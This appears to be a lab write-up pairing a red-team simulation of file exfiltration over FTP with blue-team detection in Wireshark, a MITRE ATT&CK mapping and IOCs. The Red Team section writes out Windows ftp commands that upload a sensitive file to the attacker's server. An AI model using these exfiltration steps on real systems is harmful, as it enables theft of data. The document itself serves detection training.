# 🛡️ Scenario 5 – File Transfer via FTP

## 🎯 Objective
Simulate file exfiltration using the FTP protocol and validate the Blue Team’s ability to detect cleartext FTP traffic, credentials, and transferred files via network monitoring and forensic reconstruction.

---

## 🔴 Red Team Activity

### Steps
1. **Set up FTP server on Attacker Machine (Kali)**:
   - Used `vsftpd` configured with anonymous upload support:
     ```bash
     sudo systemctl start vsftpd
     sudo systemctl enable vsftpd
     ```
   - Uploads directed into `/srv/ftp/upload/`.

2. **Exfiltrate File from Victim (Windows)**:
   - Created sensitive file `Tolusecrets.txt` containing cleartext credentials and personal data.
   - Connected to attacker’s FTP server using the built-in Windows FTP client:
     ```cmd
     ftp 192.168.2.131
     user anonymous
     pass anonymous
     passive
     binary
     lcd C:\Users\MalwareLab
     cd /upload
     put Tolusecrets.txt
     bye
     ```

### Explanation
- The attacker leveraged **FTP**, a legacy cleartext protocol, to transfer sensitive data (`Tolusecrets.txt`).
- Since FTP transmits credentials, commands, and data without encryption, everything can be captured and reconstructed by defenders.

### Evidence
- **Victim CLI (Windows)**: Successful FTP session showing login with anonymous credentials and file upload.

  ![Victim FTP Session](Screenshot%202025-08-28%20213005.png)

- **Attacker File System (Kali)**: File landed in `/srv/ftp/upload` with sensitive contents.

  ![Attacker File System](Screenshot%202025-08-28%20211742.png)

  Example contents of `Tolusecrets.txt`:
  ```
  Tolu really loves his girlfriend Isabella
  Tolu's password: Isabella123456789$$$$
  ```

---

## 🔵 Blue Team Detection

### Network Traffic Analysis (Wireshark)
- **Filter Applied**:
  ```wireshark
  ftp or ftp-data
  ```

- **Observed Traffic**:
  - Cleartext login sequence (`USER anonymous`, `PASS anonymous`).
  - `CWD /upload` (change directory command).
  - `STOR Tolusecrets.txt` (file upload initiated).
  - `226 Transfer complete` (file successfully exfiltrated).

- **Captured Evidence**:
  ![Wireshark FTP Control](Screenshot%202025-08-28%20212216.png)

  ![Wireshark FTP Session](Screenshot%202025-08-28%20212254.png)

- **Analysis**:
  - FTP protocol reveals sensitive file transfers in plain text.
  - Wireshark allows defenders to follow the `ftp-data` stream to reconstruct `Tolusecrets.txt`.

---

## 🧩 MITRE ATT&CK Mapping
- **T1048** – Exfiltration Over Alternative Protocol  
  *Adversaries may use non-standard or less monitored protocols, like FTP, for exfiltration.*
- **T1020** – Automated Exfiltration  
  *Data is exfiltrated using automated mechanisms such as built-in transfer utilities.*

---

## 📌 Indicators of Compromise (IOCs)
| Type         | Value               | Notes                                         |
|--------------|---------------------|-----------------------------------------------|
| Attacker IP  | 192.168.2.131      | Kali machine running FTP server               |
| Victim IP    | 192.168.2.129      | Windows endpoint exfiltrating file            |
| Protocol     | FTP (tcp/21 + PASV)| Cleartext credentials + file transfer          |
| File Name    | Tolusecrets.txt    | Uploaded sensitive file                       |

---

## ✅ Summary
In this scenario, the attacker exfiltrated `Tolusecrets.txt` from a Windows machine to a Kali FTP server using cleartext FTP. The Blue Team observed:
- Anonymous credentials (`USER anonymous / PASS anonymous`).
- File transfer command `STOR Tolusecrets.txt`.
- Full transfer of sensitive data visible in Wireshark.

This exercise highlights the **risks of legacy, unencrypted protocols** like FTP, which allow adversaries to exfiltrate sensitive data in the clear. Defenders must monitor for FTP traffic in modern networks and block or restrict it whenever possible.
